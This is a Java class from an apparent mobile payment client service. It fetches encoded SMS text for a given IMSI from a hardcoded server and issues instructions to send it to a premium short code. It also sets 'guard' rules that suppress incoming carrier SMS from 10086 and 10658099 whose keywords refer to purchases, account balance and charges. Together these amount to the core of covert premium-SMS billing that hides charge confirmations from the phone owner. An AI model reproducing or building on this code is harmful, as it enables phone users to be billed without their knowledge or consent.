package com.jxt.pay.appclient.service.dynamic.net;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

/**
 * http://58.215.139.112:8050/msg_content?imsi=460028174282753&msgId=2605&isenc=true
 * @author leoliu
 *
 */
public class XmwtDm1DynamicService implements IDynamicService{

	private static final String TYPE = "xmwtDm1";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String DEST = "1065843102";
	
	private static final String REQUESTMODEL = "imsi={imsi}&msgId={msgId}&isenc=true";
	
	private static final Guard guard1 = new Guard("10658099","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658099","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String msgId = map.get("msgId");
			String imsi = map.get("imsi");
			
			String param = REQUESTMODEL.replace("{msgId}",msgId).replace("{imsi}",imsi);
			
			String responseTxt = GetData.getData(url, param);
			
			xml = parse(responseTxt,map);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parse(String responseTxt,Map<String,String> map){
		
		if(responseTxt != null && responseTxt.length() > 10){
			
			try{
				String dest = map.get("dest");
				
				if(dest == null || dest.length() == 0){
					dest = DEST;
				}
				
				List<Sms> smsList = new ArrayList<Sms>();
				
				Sms sms = new Sms();
				
				sms.setSmsContent(CommonUtil.base64Decode(responseTxt));
				sms.setSmsDest(dest);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
				
				Sms guardSms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
				
				guardList.add(guard3);
				guardList.add(guard4);
				
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);
					
				return XstreamHelper.toXml(smsList);
				
			}catch(Exception e){
				
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		test();
	}
	
	private static void test(){
		String url = "http://58.215.139.112:8050/msg_content";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("type", "xmwtDm1");
		map.put("channel", "10B101a87654322");
		map.put("imsi","460025399810374");
		map.put("msgId","2605");
		
		System.out.println(new XmwtDm1DynamicService().dynamic(map));
	}
	

}
